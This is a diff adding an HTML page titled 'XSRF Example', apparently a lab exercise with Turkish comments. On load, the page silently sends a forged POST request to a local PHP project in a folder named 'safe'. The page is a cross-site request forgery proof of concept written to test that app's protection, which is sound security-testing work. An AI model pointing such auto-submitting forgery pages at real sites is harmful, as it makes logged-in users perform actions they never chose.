@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSRF Example</title>
+</head>
+<body>
+<script>
+    // POST isteği göndermek için XMLHttpRequest kullanıyoruz
+    var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/proje/safe/index.php", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        // Gönderilecek veriler
+        var data = "_POST=" + encodeURIComponent("safe");
+
+        // İstek gönderme
+        xhr.send(data);
+</script>
+</body>
+</html>
